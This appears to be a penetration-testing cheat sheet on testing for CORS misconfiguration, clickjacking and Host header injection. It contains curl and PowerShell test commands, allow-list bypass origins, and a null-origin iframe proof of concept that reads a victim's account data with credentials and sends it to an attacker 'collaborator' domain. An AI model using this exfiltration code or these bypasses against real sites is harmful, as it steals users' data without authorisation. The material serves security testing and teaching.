# 3. CORS, Clickjacking & Host Header Injection

## CORS Misconfiguration
**What it is:** server reflects arbitrary `Origin` back in `Access-Control-Allow-Origin`, sometimes with `Access-Control-Allow-Credentials: true` \u2014 lets any site read responses on behalf of a victim.

**Test**
```
# Kali
curl -H "Origin: https://evil.com" -I https://target.com
curl -H "Origin: https://evil.com" -I https://target.com/api/anything   # check any API/XHR endpoint too
# Look for: ACAO reflecting evil.com, or "*", especially combined with ACAC: true

# Windows
Invoke-WebRequest -Uri https://target.com -Headers @{Origin="https://evil.com"} -UseBasicParsing | Select -Expand Headers
```
Also test: null origin (`Origin: null`), subdomain wildcard trust (`Origin: https://target.com.evil.com`), case variations.

## Clickjacking
**What it is:** page can be framed by another site \u2014 attacker overlays invisible iframe to trick clicks.

**Test**
```html
<!-- save as test.html, open in browser -->
<iframe src="https://target.com" width="800" height="600"></iframe>
```
If it loads without error and no CSP `frame-ancestors`/`X-Frame-Options: DENY|SAMEORIGIN`, it's clickjackable.
```
# Quick header check both platforms:
curl -I https://target.com | grep -i "x-frame\|frame-ancestors"                 # Kali
(Invoke-WebRequest https://target.com -UseBasicParsing).Headers["X-Frame-Options"] # Windows
```

## Host Header Injection
**What it is:** app trusts the `Host` header for things like password-reset links, cache keys, or redirects \u2014 even static sites sometimes build absolute URLs server-side from it.

**Test**
```
# Kali
curl -H "Host: evil.com" https://target.com -v
curl -H "X-Forwarded-Host: evil.com" https://target.com -v
# look for the injected host reflected in the body, Location header, or any generated link

# Windows
Invoke-WebRequest -Uri https://target.com -Headers @{Host="evil.com"} -UseBasicParsing
```

**Impact framing:** CORS with credentials = high; clickjacking depends on what actions can be triggered via frame (low if purely static/no actions); host header injection = medium-high if it affects links sent to users or cache.

## Advanced / Bypass Techniques

### CORS \u2014 identifying exactly which regex flaw you're dealing with
Most real CORS bugs aren't "reflects anything" \u2014 they're a subtly broken allow-list regex. Test each flaw class specifically rather than throwing one payload:

| Intended rule | Flaw class | Bypass origin that still matches | Why it matches |
|---|---|---|---|
| `*.target.com` trusted | Missing end-anchor | `https://x.target.com.evil.com` | regex matches the substring `.target.com`, never checks what follows |
| `*.target.com` trusted | Unescaped dot (`.` matches any char) | `https://xXtarget.com` | the literal dot in the regex was never escaped (`\.`), so any character matches it |
| `*.target.com` trusted | Prefix-only check (`startswith`) | `https://target.com.evil.com` | code only checks the string starts with the trusted value |
| `target.com` trusted | Suffix-only check (`endswith`) | `https://evil-target.com` | code only checks the string ends with the trusted value |
| any | Case sensitivity gap | `https://TARGET.com` | some validators compare case-sensitively against a lowercase allow-list |

**Scripted sweep across all flaw classes**
```
# Kali
for ORIGIN in "https://evil.com" "null" "https://target.com.evil.com" "https://evilXtarget.com" "https://target.com-evil.com" "https://xxtarget.com"; do
  RESULT=$(curl -s -D - -o /dev/null https://target.com/api/me -H "Origin: $ORIGIN" -H "Cookie: $SESSION" | grep -i "access-control")
  echo "[$ORIGIN] -> ${RESULT:-no CORS}"
done
```
```
# Windows
$origins = "https://evil.com","null","https://target.com.evil.com","https://evilXtarget.com"
foreach ($o in $origins) {
  $h = (Invoke-WebRequest -Uri https://target.com/api/me -Headers @{Origin=$o} -UseBasicParsing).Headers
  "$o -> $($h['Access-Control-Allow-Origin'])"
}
```

### Null-origin exploitation PoC (sandboxed iframe \u2014 confirms real impact, not just a header)
```html
<!-- host this somewhere and have a "victim" session visit it -->
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
  <script>
    fetch('https://target.com/api/me', {credentials:'include'})
      .then(r=>r.text())
      .then(d=>fetch('https://your-collaborator-domain.com/exfil?d='+encodeURIComponent(d)));
  </script>
"></iframe>
```
A sandboxed iframe without `allow-same-origin` always sends `Origin: null` \u2014 the classic way to weaponize a `null`-trusting policy even when the attacker has no real domain to point at.

### Pre-flight (OPTIONS) gating bypass
Some servers only apply strict Origin checks on the actual request but not the `OPTIONS` pre-flight, or vice versa \u2014 always test both:
```
curl -X OPTIONS https://target.com/api/me -H "Origin: https://evil.com" -H "Access-Control-Request-Method: GET" -v
```

### Clickjacking \u2014 when CSP exists but is still bypassable
```
# frame-ancestors with a wildcard subdomain is still exploitable if you control ANY subdomain or an open redirect on one
Content-Security-Policy: frame-ancestors *.target.com
# combine with a subdomain takeover (see that file) or an open redirect on a trusted subdomain to still frame the page
```

**Resources:** Intigriti's "Complete guide to exploiting advanced CORS misconfiguration vulnerabilities", PortSwigger's URL validation bypass cheat sheet, HackTricks CORS Misconfigurations & Bypass page.
